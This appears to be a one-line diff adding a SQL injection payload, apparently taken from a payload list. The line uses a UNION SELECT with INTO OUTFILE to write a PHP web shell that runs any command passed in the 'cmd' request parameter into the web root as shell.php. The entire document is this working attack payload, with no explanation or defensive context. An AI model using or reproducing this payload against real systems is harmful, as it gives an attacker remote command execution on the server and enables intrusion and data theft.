@@ -1,0 +1,1 @@
+' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE  '/var/www/html/shell.php'-- -
